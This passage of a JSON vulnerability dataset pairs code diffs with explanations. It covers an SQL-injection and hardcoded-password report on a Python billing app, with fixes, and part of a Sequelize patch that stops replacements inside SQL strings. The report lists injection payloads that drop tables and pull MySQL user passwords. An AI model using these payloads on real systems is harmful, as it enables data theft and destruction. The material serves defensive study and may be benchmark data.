\t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"insert \", 1}},\n \t\t\targs:     []interface{}{time.Date(2020, time.March, 1, 23, 59, 59, 999999999, time.UTC)},\n-\t\t\texpected: `insert '2020-03-01 23:59:59.999999Z'`,\n+\t\t\texpected: `insert ('2020-03-01 23:59:59.999999Z')`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select 1-\", 1}},\n",
        "explanation": "The code contains one high severity CWE-89 (SQL Injection) and one medium severity CWE-798 (Hardcoded Credentials) issue. \n==============================================================\nCWE-89:\n\nExplanation:\nSQL Injection in find_item() : Direct string formatting in SQL queries allows attackers to inject malicious SQL code.\nSQL Injection in add_item(): Unsanitized item_name and item_price used in string formatting.\nSQL Injection in modify_item(): Unfiltered item_id, item_name, and item_price in UPDATE query.\nSQL Injection in date_wise_sell(): Unsanitized date inputs in BETWEEN clause.\nSQL Injection in search_item(): Unfiltered LIKE clause with direct string formatting.\n\n\nPOC: \nSQL Injection in find_item() : Enter 1 OR 1=1 as the item ID to retrieve all items.\nSQL Injection in add_item(): Inject test\", 100); DROP TABLE items; -- as item name.\nSQL Injection in modify_item(): Set item_id to 1; DROP TABLE bills; --\nSQL Injection in date_wise_sell(): Use 2000-01-01\" UNION SELECT user, password FROM mysql.user; -- as start date.\nSQL Injection in search_item(): Enter %\" UNION SELECT 1,table_name,3 FROM information_schema.tables; --\n\n\n\nRoot Cause: \nFile https://github.com/nomaanahmeddd/Billing-System-using-Python/blob/main/billing_system.py\nSQL Injection in find_item() : Line cursor.execute('select * from items where id ={}'.format(no)) in find_item()\nSQL Injection in add_item(): Lines with sql = 'select * from items where item_name like \"%{}%\"'.format(item_name) and sql = 'insert into items(...'\nSQL Injection in modify_item(): Line sql = 'update items set item_name = \"{}\", price ={} where id={}'.format(...)\nSQL Injection in date_wise_sell(): Line sql = 'select * from bills where bill_date between \"{}\" and \"{}\"'.format(...)\nSQL Injection in search_item(): Line sql ='select * from items where item_name like \"%{}%\";'.format(item_name)\n\n\nExploit Scenario: \nSQL Injection in find_item() : An attacker retrieves all item records by manipulating the no parameter.\nSQL Injection in add_item(): Attacker deletes the items table or exfiltrates data.\nSQL Injection in modify_item(): Attacker deletes billing records or modifies prices.\nSQL Injection in date_wise_sell(): Attacker extracts sensitive user credentials.\nSQL Injection in search_item(): Attacker maps database schema.\n\n\n\n\nWhy it Happens: \nRaw user input concatenated into SQL without parameterization.\n\n\nSecurity Implications: \nUnauthorized data access, database tampering, privilege escalation, Financial fraud, data integrity loss and Credential theft.\n\n\nSuggested Fix:\nUse Parametrized Queries\n\nPatch Fix:\n\ncursor.execute('select * from items where id = %s', (no,))\n\ncursor.execute('select * from items where item_name LIKE %s', (\"%\" + item_name + \"%\",))\ncursor.execute('insert into items(item_name,price) values(%s,%s)', (item_name, item_price))\n\ncursor.execute('update items set item_name=%s, price=%s where id=%s', (item_name, item_price, item_id))\n\ncursor.execute('select * from bills where bill_date BETWEEN %s AND %s', (start_date, end_date))\n\ncursor.execute('select * from items where item_name LIKE %s', (\"%\" + item_name + \"%\",))\n\n===============================================================\n\nCWE-798 :\n\nExplanation: \nFixed hardcoded credentials (admin/1234) with no password hashing.\n\n\nRoot Cause: \nFile https://github.com/nomaanahmeddd/Billing-System-using-Python/blob/main/billing_system.py\nFunction login(): Line 35 : if password == '1234'\n\n\nSecurity Implications: \nEasy credential guessing, exposure of credentials in case of code leakage.\n\n\nSuggested Fix:\nUse environment variables and bcrypt hashing.\n\nPatch Fix:\n\nimport os\nimport bcrypt\n\nstored_hash = os.getenv('ADMIN_HASH')  # Pre-computed bcrypt hash\ninput_hash = bcrypt.hashpw(password.encode(), stored_hash.encode())\nif bcrypt.checkpw(password.encode(), stored_hash.encode()):\n    # Grant access"
    },
    "165": {
        "diff": "From ccaa3996047fe00048d5993ab2dd43ebadd4f78b Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Zo=C3=A9?= <zoe@ephys.dev>\nDate: Fri, 13 May 2022 14:27:50 +0200\nSubject: [PATCH] fix: do not replace `:replacements` inside of strings\n (#14472)\n\n---\n package.json                                  |   1 +\n src/dialects/abstract/index.d.ts              | 106 ++++++\n src/sequelize.js                              |   9 +-\n src/sql-string.d.ts                           |   2 +-\n src/utils.js                                  |  13 +\n src/utils/sql.ts                              | 221 ++++++++++++\n test/integration/sequelize/query.test.js      |  12 +-\n test/support.js                               |   8 +-\n .../abstract/query-interface.test.d.ts        |   1 +\n test/unit/logger.test.d.ts                    |   1 +\n test/unit/query-interface/bulk-delete.test.js |  38 ++\n test/unit/query-interface/bulk-insert.test.js |  32 ++\n test/unit/query-interface/decrement.test.js   |  45 +++\n test/unit/query-interface/delete.test.js      |  38 ++\n test/unit/query-interface/increment.test.js   |  45 +++\n test/unit/query-interface/raw-select.test.js  |  35 ++\n test/unit/query-interface/select.test.js      |  35 ++\n test/unit/query-interface/stub-query-run.js   |  22 ++\n test/unit/sequelize.test.d.ts                 |   1 +\n test/unit/utils/sql.test.js                   | 327 ++++++++++++++++++\n yarn.lock                                     |   5 +\n 21 files changed, 982 insertions(+), 15 deletions(-)\n create mode 100644 src/dialects/abstract/index.d.ts\n create mode 100644 src/utils/sql.ts\n create mode 100644 test/unit/dialects/abstract/query-interface.test.d.ts\n create mode 100644 test/unit/logger.test.d.ts\n create mode 100644 test/unit/query-interface/bulk-delete.test.js\n create mode 100644 test/unit/query-interface/bulk-insert.test.js\n create mode 100644 test/unit/query-interface/decrement.test.js\n create mode 100644 test/unit/query-interface/delete.test.js\n create mode 100644 test/unit/query-interface/increment.test.js\n create mode 100644 test/unit/query-interface/raw-select.test.js\n create mode 100644 test/unit/query-interface/select.test.js\n create mode 100644 test/unit/query-interface/stub-query-run.js\n create mode 100644 test/unit/sequelize.test.d.ts\n create mode 100644 test/unit/utils/sql.test.js\n\ndiff --git a/package.json b/package.json\nindex 08e3cb857c87..2d37e64aec2e 100644\n--- a/package.json\n+++ b/package.json\n@@ -61,6 +61,7 @@\n     \"@octokit/rest\": \"^18.12.0\",\n     \"@octokit/types\": \"^6.34.0\",\n     \"@types/chai\": \"^4.3.0\",\n+    \"@types/lodash\": \"4.14.182\",\n     \"@types/mocha\": \"^9.0.0\",\n     \"@types/node\": \"^16.11.17\",\n     \"@types/sinon\": \"^10.0.6\",\ndiff --git a/src/dialects/abstract/index.d.ts b/src/dialects/abstract/index.d.ts\nnew file mode 100644\nindex 000000000000..018463fec091\n--- /dev/null\n+++ b/src/dialects/abstract/index.d.ts\n@@ -0,0 +1,106 @@\n+import type { Dialect } from '../../sequelize.js';\n+import type { AbstractQuery } from './query.js';\n+\n+export declare type DialectSupports = {\n+  'DEFAULT': boolean;\n+  'DEFAULT VALUES': boolean;\n+  'VALUES ()': boolean;\n+  'LIMIT ON UPDATE': boolean;\n+  'ON DUPLICATE KEY': boolean;\n+  'ORDER NULLS': boolean;\n+  'UNION': boolean;\n+  'UNION ALL': boolean;\n+  'RIGHT JOIN': boolean;\n+  EXCEPTION: boolean;\n+  forShare?: 'LOCK IN SHARE MODE' | 'FOR SHARE' | undefined;\n+  lock: boolean;\n+  lockOf: boolean;\n+  lockKey: boolean;\n+  lockOuterJoinFailure: boolean;\n+  skipLocked: boolean;\n+  finalTable: boolean;\n+  returnValues: false | {\n+    output: boolean;\n+    returning: boolean;\n+  };\n+  autoIncrement: {\n+    identityInsert: boolean;\n+    defaultValue: boolean;\n+    update: boolean;\n+  };\n+  bulkDefault: boolean;\n+  schemas: boolean;\n+  transactions: boolean;\n+  settingIsolationLevelDuringTransaction: boolean;\n+  transactionOptions: {\n+    type: boolean;\n+  };\n+  migrations: boolean;\n+  upserts: boolean;\n+  inserts: {\n+    ignoreDuplicates: string;\n+    updateOnDuplicate: boolean | string;\n+    onConflictDoNothing: string;\n+    conflictFields: boolean;\n+  };\n+  constraints: {\n+    restrict: boolean;\n+    addConstraint: boolean;\n+    dropConstraint: boolean;\n+    unique: boolean;\n+    default: boolean;\n+    check: boolean;\n+    foreignKey: boolean;\n+    primaryKey: boolean;\n+    onUpdate: boolean;\n+  };\n+  index: {\n+    collate: boolean;\n+    length: boolean;\n+    parser: boolean;\n+    concurrently: boolean;\n+    type: boolean;\n+    using: boolean | number;\n+    functionBased: boolean;\n+    operator: boolean;\n+    where: boolean;\n+  };\n+  groupedLimit: boolean;\n+  indexViaAlter: boolean;\n+  JSON: boolean;\n+  JSONB: boolean;\n+  ARRAY: boolean;\n+  RANGE: boolean;\n+  NUMERIC: boolean;\n+  GEOMETRY: boolean;\n+  GEOGRAPHY: boolean;\n+  REGEXP: boolean;\n+  /**\n+   * Case-insensitive regexp operator support ('~*' in postgres).\n+   */\n+  IREGEXP: boolean;\n+  HSTORE: boolean;\n+  TSVECTOR: boolean;\n+  deferrableConstraints: boolean;\n+  tmpTableTrigger: boolean;\n+  indexHints: boolean;\n+  searchPath: boolean;\n+};\n+\n+export declare abstract class AbstractDialect {\n+  /**\n+   * List of features this dialect supports.\n+   *\n+   * Important: Dialect implementations inherit these values.\n+   * When changing a default, ensure the implementations still properly declare which feature they support.\n+   */\n+  static readonly supports: DialectSupports;\n+  readonly defaultVersion: string;\n+  readonly Query: typeof AbstractQuery;\n+  readonly name: Dialect;\n+  readonly TICK_CHAR: string;\n+  readonly TICK_CHAR_LEFT: string;\n+  readonly TICK_CHAR_RIGHT: string;\n+  readonly queryGenerator: unknown;\n+  get supports(): DialectSupports;\n+}\ndiff --git a/src/sequelize.js b/src/sequelize.js\nindex 4e21665d0489..e424a9a2b2d2 100644\n--- a/src/sequelize.js\n+++ b/src/sequelize.js\n@@ -26,6 +26,7 @@ const { BelongsTo } = require('./associations/belongs-to');\n const HasOne = require('./associations/has-one');\n const { BelongsToMany } = require('./associations/belongs-to-many');\n const { HasMany } = require('./associations/has-many');\n+const { injectReplacements } = require('./utils/sql');\n \n /**\n  * This is the main class, the entry point to sequelize.\n@@ -598,11 +599,7 @@ class Sequelize {\n     }\n \n     if (options.replacements) {\n-      if (Array.isArray(options.replacements)) {\n-        sql = Utils.format([sql].concat(options.replacements), this.options.dialect);\n-      } else {\n-        sql = Utils.formatNamedParameters(sql, options.replacements, this.options.dialect);\n-      }\n+      sql = injectReplacements(sql, this.dialect, options.replacements);\n     }\n \n     let bindParameters;\n@@ -629,7 +626,7 @@ class Sequelize {\n       checkTransaction();\n \n       const connection = await (options.transaction ? options.transaction.connection : this.connectionManager.getConnection(options));\n-      \n+\n       if (this.options.dialect === 'db2' && options.alter) {\n         if (options.alter.drop === false) {\n           connection.dropTable = false;\ndiff --git a/src/sql-string.d.ts b/src/sql-string.d.ts\nindex bf2d068acd98..310402495179 100644\n--- a/src/sql-string.d.ts\n+++ b/src/sql-string.d.ts\n@@ -1,5 +1,5 @@\n export type Escapable = undefined | null | boolean | number | string | Date;\n export function escapeId(val: string, forbidQualified?: boolean): string;\n-export function escape(val: Escapable | Escapable[], timeZone?: string, dialect?: string, format?: string): string;\n+export function escape(val: Escapable | Escapable[], timeZone?: string, dialect?: string, format?: boolean): string;\n export function format(sql: string, values: unknown[], timeZone?: string, dialect?: string): string;\n export function formatNamedParameters(sql: string, values: unknown[], timeZone?: string, dialect?: string): string;\ndiff --git a/src/utils.js b/src/utils.js\nindex 703fd7d0b628..739dbcfd2232 100644\n--- a/src/utils.js\n+++ b/src/utils.js\n@@ -114,6 +114,12 @@ function pluralize(str) {\n }\n exports.pluralize = pluralize;\n \n+/**\n+ * @deprecated use {@link injectReplacements} instead. This method has been removed in v7.\n+ *\n+ * @param {[string, ...unknown[]]} arr - first item is the SQL, following items are the positional replacements.\n+ * @param {AbstractDialect} dialect\n+ */\n function format(arr, dialect) {\n   const timeZone = null;\n   // Make a clone of the array beacuse format modifies the passed args\n@@ -121,6 +127,13 @@ function format(arr, dialect) {\n }\n exports.format = format;\n \n+/**\n+ * @deprecated use {@link injectReplacements} instead. This method has been removed in v7.\n+ *\n+ * @param {string} sql\n+ * @param {object} parameters\n+ * @param {AbstractDialect} dialect\n+ */\n function formatNamedParameters(sql, parameters, dialect) {\n   const timeZone = null;\n   return SqlString.formatNamedParameters(sql, parameters, timeZone, dialect);\ndiff --git a/src/utils/sql.ts b/src/utils/sql.ts\nnew file mode 100644\nindex 000000000000..c252cd2704ea\n--- /dev/null\n+++ b/src/utils/sql.ts\n@@ -0,0 +1,221 @@\n+import isPlainObject from 'lodash/isPlainObject';\n+import type { AbstractDialect } from '../dialects/abstract/index.js';\n+import { escape as escapeSqlValue } from '../sql-string';\n+\n+type BindOrReplacements = { [key: string]: unknown } | unknown[];\n+\n+/**\n+ * Inlines replacements in places where they would be valid SQL values.\n+ *\n+ * @param sqlString The SQL that contains the replacements\n+ * @param dialect The dialect of the SQL\n+ * @param replacements if provided, this method will replace ':named' replacements & positional replacements (?)\n+ *\n+ * @returns The SQL with replacements rewritten in their dialect-specific syntax.\n+ */\n+export function injectReplacements(\n+  sqlString: string,\n+  dialect: AbstractDialect,\n+  replacements: BindOrReplacements\n+): string {\n+  if (replacements == null) {\n+    return sqlString;\n+  }\n+\n+  if (!Array.isArray(replacements) && !isPlainObject(replacements)) {\n+    throw new TypeError(`\"replacements\" must be an array or a plain object, but received ${JSON.stringify(replacements)} instead.`);\n+  }\n+\n+  const isNamedReplacements = isPlainObject(replacements);\n+  const isPositionalReplacements = Array.isArray(replacements);\n+  let lastConsumedPositionalReplacementIndex = -1;\n+\n+  let output = '';\n+\n+  let currentDollarStringTagName = null;\n+  let isString = false;\n+  let isColumn = false;\n+  let previousSliceEnd = 0;\n+  let isSingleLineComment = false;\n+  let isCommentBlock = false;\n+\n+  for (let i = 0; i < sqlString.length; i++) {\n+    const char = sqlString[i];\n+\n+    if (isColumn) {\n+      if (char === dialect.TICK_CHAR_RIGHT) {\n+        isColumn = false;\n+      }\n+\n+      continue;\n+    }\n+\n+    if (isString) {\n+      if (char === '\\'' && !isBackslashEscaped(sqlString, i - 1)) {\n+        isString = false;\n+      }\n+\n+      continue;\n+    }\n+\n+    if (currentDollarStringTagName !== null) {\n+      if (char !== '$') {\n+        continue;\n+      }\n+\n+      const remainingString = sqlString.slice(i, sqlString.length);\n+\n+      const dollarStringStartMatch = remainingString.match(/^\\$(?<name>[a-z_][0-9a-z_])?(\\$)/i);\n+      const tagName = dollarStringStartMatch?.groups?.name;\n+      if (currentDollarStringTagName === tagName) {\n+        currentDollarStringTagName = null;\n+      }\n+\n+      continue;\n+    }\n+\n+    if (isSingleLineComment) {\n+      if (char === '\\n') {\n+        isSingleLineComment = false;\n+      }\n+\n+      continue;\n+    }\n+\n+    if (isCommentBlock) {\n+      if (char === '*' && sqlString[i + 1] === '/') {\n+        isCommentBlock = false;\n+      }\n+\n+      continue;\n+    }\n+\n+    if (char === dialect.TICK_CHAR_LEFT) {\n+      isColumn = true;\n+      continue;\n+    }\n+\n+    if (char === '\\'') {\n+      isString = true;\n+      continue;\n+    }\n+\n+    if (char === '-' && sqlString.slice(i, i + 3) === '-- ') {\n+      isSingleLineComment = true;\n+      continue;\n+    }\n+\n+    if (char === '/' && sqlString.slice(i, i + 2) === '/*') {\n+      isCommentBlock = true;\n+      continue;\n+    }\n+\n+    // either the start of a $bind parameter, or the start of a $tag$string$tag$\n+    if (char === '$') {\n+      const previousChar = sqlString[i - 1];\n+\n+      // we are part of an identifier\n+      if (/[0-9a-z_]/i.test(previousChar)) {\n+        continue;\n+      }\n+\n+      const remainingString = sqlString.slice(i, sqlString.length);\n+\n+      const dollarStringStartMatch = remainingString.match(/^\\$(?<name>[a-z_][0-9a-z_]*)?\\$/i);\n+      if (dollarStringStartMatch) {\n+        currentDollarStringTagName = dollarStringStartMatch.groups?.name ?? '';\n+\n+        continue;\n+      }\n+\n+      continue;\n+    }\n+\n+    if (isNamedReplacements && char === ':') {\n+      const previousChar = sqlString[i - 1];\n+      // we want to be conservative with what we consider to be a replacement to avoid risk of conflict with potential operators\n+      // users need to add a space before the bind parameter (except after '(', ',', and '=')\n+      if (previousChar !== undefined && !/[\\s(,=]/.test(previousChar)) {\n+        continue;\n+      }\n+\n+      const remainingString = sqlString.slice(i, sqlString.length);\n+\n+      const match = remainingString.match(/^:(?<name>[a-z_][0-9a-z_]*)(?:\\)|,|$|\\s|::)/i);\n+      const replacementName = match?.groups?.name;\n+      if (!replacementName) {\n+        continue;\n+      }\n+\n+      // @ts-expect-error -- isPlainObject does not tell typescript that replacements is a plain object, not an array\n+      const replacementValue = replacements[replacementName];\n+      if (!Object.prototype.hasOwnProperty.call(replacements, replacementName) || replacementValue === undefined) {\n+        throw new Error(`Named replacement \":${replacementName}\" has no entry in the replacement map.`);\n+      }\n+\n+      const escapedReplacement = escapeSqlValue(replacementValue, undefined, dialect.name, true);\n+\n+      // add everything before the bind parameter name\n+      output += sqlString.slice(previousSliceEnd, i);\n+      // continue after the bind parameter name\n+      previousSliceEnd = i + replacementName.length + 1;\n+\n+      output += escapedReplacement;\n+\n+      continue;\n+    }\n+\n+    if (isPositionalReplacements && char === '?') {\n+      const previousChar = sqlString[i - 1];\n+\n+      // we want to be conservative with what we consider to be a replacement to avoid risk of conflict with potential operators\n+      // users need to add a space before the bind parameter (except after '(', ',', and '=')\n+      if (previousChar !== undefined && !/[\\s(,=]/.test(previousChar)) {\n+        continue;\n+      }\n+\n+      // don't parse ?| and ?& operators as replacements\n+      const nextChar = sqlString[i + 1];\n+      if (nextChar === '|' || nextChar === '&') {\n+        continue;\n+      }\n+\n+      const replacementIndex = ++lastConsumedPositionalReplacementIndex;\n+      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n+      // @ts-ignore -- ts < 4.4 loses the information that 'replacements' is an array when using 'isPositionalReplacements' instead of 'Array.isArray'\n+      //  but performance matters here.\n+      const replacementValue = replacements[lastConsumedPositionalReplacementIndex];\n+\n+      if (replacementValue === undefined) {\n+        throw new Error(`Positional replacement (?) ${replacementIndex} has no entry in the replacement map (replacements[${replacementIndex}] is undefined).`);\n+      }\n+\n+      const escapedReplacement = escapeSqlValue(replacementValue as any, undefined, dialect.name, true);\n+\n+      // add everything before the bind parameter name\n+      output += sqlString.slice(previousSliceEnd, i);\n+      // continue after the bind parameter name\n+      previousSliceEnd = i + 1;\n+\n+      output += escapedReplacement;\n+    }\n+  }\n+\n+  output += sqlString.slice(previousSliceEnd, sqlString.length);\n+\n+  return output;\n+}\n+\n+function isBackslashEscaped(string: string, pos: number): boolean {\n+  let escaped = false;\n+  for (let i = pos; i >= 0; i--) {\n+    const char = string[i];\n+    if (char !== '\\\\') {\n+      break;\n+    }\n+\n+    escaped = !escaped;\n+  }\n+\n+  return escaped;\n+}\ndiff --git a/test/integration/sequelize/query.test.js b/test/integration/sequelize/query.test.js\nindex 1cc9ad76af09..767940b5dbe9 100644\n--- a/test/integration/sequelize/query.test.js\n+++ b/test/integration/sequelize/query.test.js\n@@ -457,27 +457,27 @@ describe(Support.getTestDialectTeaser('Sequelize'), () => {\n \n       it('reject when key is missing in the passed object', async function() {\n         await this.sequelize.query('select :one as foo, :two as bar, :three as baz', { raw: true, replacements: { one: 1, two: 2 } })\n-          .should.be.rejectedWith(Error, /Named parameter \":\\w+\" has no value in the given object\\./g);\n+          .should.be.rejectedWith(Error, 'Named replacement \":three\" has no entry in the replacement map.');\n       });\n \n       it('reject with the passed number', async function() {\n         await this.sequelize.query('select :one as foo, :two as bar', { raw: true, replacements: 2 })\n-          .should.be.rejectedWith(Error, /Named parameter \":\\w+\" has no value in the given object\\./g);\n+          .should.be.rejectedWith(Error, '\"replacements\" must be an array or a plain object, but received 2 instead.');\n       });\n \n       it('reject with the passed empty object', async function() {\n         await this.sequelize.query('select :one as foo, :two as bar', { raw: true, replacements: {} })\n-          .should.be.rejectedWith(Error, /Named parameter \":\\w+\" has no value in the given object\\./g);\n+          .should.be.rejectedWith(Error, 'Named replacement \":one\" has no entry in the replacement map.');\n       });\n \n       it('reject with the passed string', async function() {\n         await this.sequelize.query('select :one as foo, :two as bar', { raw: true, replacements: 'foobar' })\n-          .should.be.rejectedWith(Error, /Named parameter \":\\w+\" has no value in the given object\\./g);\n+          .should.be.rejectedWith(Error, '\"replacements\" must be an array or a plain object, but received \"foobar\" instead.');\n       });\n \n       it('reject with the passed date', async function() {\n-        await this.sequelize.query('select :one as foo, :two as bar', { raw: true, replacements: new Date() })\n-          .should.be.rejectedWith(Error, /Named parameter \":\\w+\" has no value in the given object\\./g);\n+        await this.sequelize.query('select :one as foo, :two as bar', { raw: true, replacements: new Buffer([1]) })\n+          .should.be.rejectedWith(Error, '\"replacements\" must be an array or a plain object, but received {\"type\":\"Buffer\",\"data\":[1]} instead.');\n       });\n \n       it('reject when binds passed with object and numeric $1 is also present', async function() {\ndiff --git a/test/support.js b/test/support.js\nindex 34e6c9c7dfcd..fe621ec9a909 100644\n--- a/test/support.js\n+++ b/test/support.js\n@@ -241,7 +241,7 @@ const Support = {\n     if (query instanceof Error) {\n       expect(query.message).to.equal(expectation.message);\n     } else {\n-      expect(query.query || query).to.equal(expectation);\n+      expect(Support.minifySql(query.query || query)).to.equal(Support.minifySql(expectation));\n     }\n \n     if (assertions.bind) {\n@@ -267,8 +267,12 @@ const Support = {\n   minifySql(sql) {\n     // replace all consecutive whitespaces with a single plain space character\n     return sql.replace(/\\s+/g, ' ')\n-      // remove space before coma\n+      // remove space before comma\n       .replace(/ ,/g, ',')\n+      // remove space before )\n+      .replace(/ \\)/g, ')')\n+      // replace space after (\n+      .replace(/\\( /g, '(')\n       // remove whitespace at start & end\n       .trim();\n   }\ndiff --git a/test/unit/dialects/abstract/query-interface.test.d.ts b/test/unit/dialects/abstract/query-interface.test.d.ts\nnew file mode 100644\nindex 000000000000..cb0ff5c3b541\n--- /dev/null\n+++ b/test/unit/dialects/abstract/query-interface.test.d.ts\n@@ -0,0 +1 @@\n+export {};\ndiff --git a/test/unit/logger.test.d.ts b/test/unit/logger.test.d.ts\nnew file mode 100644\nindex 000000000000..cb0ff5c3b541\n--- /dev/null\n+++ b/test/unit/logger.test.d.ts\n@@ -0,0 +1 @@\n+export {};\ndiff --git a/test/unit/query-interface/bulk-delete.test.js b/test/unit/query-interface/bulk-delete.test.js\nnew file mode 100644\nindex 000000000000..7d2449bda3c6\n--- /dev/null\n+++ b/test/unit/query-interface/bulk-delete.test.js\n@@ -0,0 +1,38 @@\n+const { DataTypes } = require('sequelize');\n+const sinon = require('sinon');\n+const { expectsql, sequelize } = require('../../support');\n+const { stubQueryRun } = require('./stub-query-run');\n+\n+describe('QueryInterface#bulkDelete', () => {\n+  const User = sequelize.define('User', {\n+    firstName: DataTypes.STRING\n+  }, { timestamps: false });\n+\n+  afterEach(() => {\n+    sinon.restore();\n+  });\n+\n+  // you'll find more replacement tests in query-generator tests\n+  it('does not parse replacements outside of raw sql', async () => {\n+    const getSql = stubQueryRun();\n+\n+    await sequelize.getQueryInterface().bulkDelete(\n+      User.tableName,\n+      { id: ':id' },\n+      {\n+        logging: console.log,\n+        replacements: {\n+          limit: 1,\n+          id: '123'\n+        }\n+      },\n+      User\n+    );\n+\n+    expectsql(getSql(), {\n+      default: 'DELETE FROM [Users] WHERE [id] = \\':id\\'',\n+      mssql: 'DELETE FROM [Users] WHERE [id] = N\\':id\\'; SELECT @@ROWCOUNT AS AFFECTEDROWS;',\n+      snowflake: 'DELETE FROM \"Users\" WHERE \"id\" = \\':id\\';'\n+    });\n+  });\n+});\ndiff --git a/test/unit/query-interface/bulk-insert.test.js b/test/unit/query-interface/bulk-insert.test.js\nnew file mode 100644\nindex 000000000000..6ab4aa7dc405\n--- /dev/null\n+++ b/test/unit/query-interface/bulk-insert.test.js\n@@ -0,0 +1,32 @@\n+const { DataTypes } = require('sequelize');\n+const sinon = require('sinon');\n+const { expectsql, sequelize } = require('../../support');\n+const { stubQueryRun } = require('./stub-query-run');\n+\n+describe('QueryInterface#bulkInsert', () => {\n+  const User = sequelize.define('User', {\n+    firstName: DataTypes.STRING\n+  }, { timestamps: false });\n+\n+  afterEach(() => {\n+    sinon.restore();\n+  });\n+\n+  // you'll find more replacement tests in query-generator tests\n+  it('does not parse replacements outside of raw sql', async () => {\n+    const getSql = stubQueryRun();\n+\n+    await sequelize.getQueryInterface().bulkInsert(User.tableName, [{\n+      firstName: ':injection'\n+    }], {\n+      replacements: {\n+        injection: 'raw sql'\n+      }\n+    });\n+\n+    expectsql(getSql(), {\n+      default: 'INSERT INTO [Users] ([firstName]) VALUES (\\':injection\\');',\n+      mssql: 'INSERT INTO [Users] ([firstName]) VALUES (N\\':injection\\');'\n+    });\n+  });\n+});\ndiff --git a/test/unit/query-interface/decrement.test.js b/test/unit/query-interface/decrement.test.js\nnew file mode 100644\nindex 000000000000..8a0cb1cba311\n--- /dev/null\n+++ b/test/unit/query-interface/decrement.test.js\n@@ -0,0 +1,45 @@\n+const { DataTypes } = require('sequelize');\n+const sinon = require('sinon');\n+const { expectsql, sequelize } = require('../../support');\n+const { stubQueryRun } = require('./stub-query-run');\n+\n+describe('QueryInterface#decrement', () => {\n+  const User = sequelize.define('User', {\n+    firstName: DataTypes.STRING\n+  }, { timestamps: false });\n+\n+  afterEach(() => {\n+    sinon.restore();\n+  });\n+\n+  // you'll find more replacement tests in query-generator tests\n+  it('does not parse replacements outside of raw sql', async () => {\n+    const getSql = stubQueryRun();\n+\n+    await sequelize.getQueryInterface().decrement(\n+      User,\n+      User.tableName,\n+      // where\n+      { id: ':id' },\n+      // incrementAmountsByField\n+      { age: ':age' },\n+      // extraAttributesToBeUpdated\n+      { name: ':name' },\n+      // options\n+      {\n+        returning: [':data'],\n+        replacements: {\n+          age: 1,\n+          id: 2,\n+          data: 3\n+        }\n+      }\n+    );\n+\n+    expectsql(getSql(), {\n+      default: 'UPDATE [Users] SET [age]=[age]- \\':age\\',[name]=\\':name\\' WHERE [id] = \\':id\\'',\n+      postgres: 'UPDATE \"Users\" SET \"age\"=\"age\"- \\':age\\',\"name\"=\\':name\\' WHERE \"id\" = \\':id\\' RETURNING \":data\"',\n+      mssql: 'UPDATE [Users] SET [age]=[age]- N\\':age\\',[name]=N\\':name\\' OUTPUT INSERTED.[:data] WHERE [id] = N\\':id\\''\n+    });\n+  });\n+});\ndiff --git a/test/unit/query-interface/delete.test.js b/test/unit/query-interface/delete.test.js\nnew file mode 100644\nindex 000000000000..68469dee8dd4\n--- /dev/null\n+++ b/test/unit/query-interface/delete.test.js\n@@ -0,0 +1,38 @@\n+const { DataTypes } = require('sequelize');\n+const sinon = require('sinon');\n+const { expectsql, sequelize } = require('../../support');\n+const { stubQueryRun } = require('./stub-query-run');\n+\n+describe('QueryInterface#delete', () => {\n+  const User = sequelize.define('User', {\n+    firstName: DataTypes.STRING\n+  }, { timestamps: false });\n+\n+  afterEach(() => {\n+    sinon.restore();\n+  });\n+\n+  // you'll find more replacement tests in query-generator tests\n+  it('does not parse replacements outside of raw sql', async () => {\n+    const getSql = stubQueryRun();\n+    const instance = new User();\n+\n+    await sequelize.getQueryInterface().delete(\n+      instance,\n+      User.tableName,\n+      { id: ':id' },\n+      {\n+        replacements: {\n+          limit: 1,\n+          id: '123'\n+        }\n+      }\n+    );\n+\n+    expectsql(getSql(), {\n+      default: 'DELETE FROM [Users] WHERE [id] = \\':id\\'',\n+      mssql: 'DELETE FROM [Users] WHERE [id] = N\\':id\\'; SELECT @@ROWCOUNT AS AFFECTEDROWS;',\n+      snowflake: 'DELETE FROM \"Users\" WHERE \"id\" = \\':id\\';'\n+    });\n+  });\n+});\ndiff --git a/test/unit/query-interface/increment.test.js b/test/unit/query-interface/increment.test.js\nnew file mode 100644\nindex 000000000000..05ab9bedb726\n--- /dev/null\n+++ b/test/unit/query-interface/increment.test.js\n@@ -0,0 +1,45 @@\n+const { DataTypes } = require('sequelize');\n+const sinon = require('sinon');\n+const { expectsql, sequelize } = require('../../support');\n+const { stubQueryRun } = require('./stub-query-run');\n+\n+describe('QueryInterface#increment', () => {\n+  const User = sequelize.define('User', {\n+    firstName: DataTypes.STRING\n+  }, { timestamps: false });\n+\n+  afterEach(() => {\n+    sinon.restore();\n+  });\n+\n+  // you'll find more replacement tests in query-generator tests\n+  it('does not parse replacements outside of raw sql', async () => {\n+    const getSql = stubQueryRun();\n+\n+    await sequelize.getQueryInterface().increment(\n+      User,\n+      User.tableName,\n+      // where\n+      { id: ':id' },\n+      // incrementAmountsByField\n+      { age: ':age' },\n+      // extraAttributesToBeUpdated\n+      { name: ':name' },\n+      // options\n+      {\n+        returning: [':data'],\n+        replacements: {\n+          age: 1,\n+          id: 2,\n+          data: 3\n+        }\n+      }\n+    );\n+\n+    expectsql(getSql(), {\n+      default: 'UPDATE [Users] SET [age]=[age]+ \\':age\\',[name]=\\':name\\' WHERE [id] = \\':id\\'',\n+      postgres: 'UPDATE \"Users\" SET \"age\"=\"age\"+ \\':age\\',\"name\"=\\':name\\' WHERE \"id\" = \\':id\\' RETURNING \":data\"',\n+      mssql: 'UPDATE [Users] SET [age]=[age]+ N\\':age\\',[name]=N\\':name\\' OUTPUT INSERTED.[:data] WHERE [id] = N\\':id\\''\n+    });\n+  });\n+});\ndiff --git a/test/unit/query-interface/raw-select.test.js b/test/unit/query-interface/raw-select.test.js\nnew file mode 100644\nindex 000000000000..8404ef27bf85\n--- /dev/null\n+++ b/test/unit/query-interface/raw-select.test.js\n@@ -0,0 +1,35 @@\n+const { DataTypes } = require('sequelize');\n+const sinon = require('sinon');\n+const { expectsql, sequelize } = require('../../support');\n+const { stubQueryRun } = require('./stub-query-run');\n+\n+describe('QueryInterface#rawSelect', () => {\n+  const User = sequelize.define('User', {\n+    firstName: DataTypes.STRING\n+  }, { timestamps: false });\n+\n+  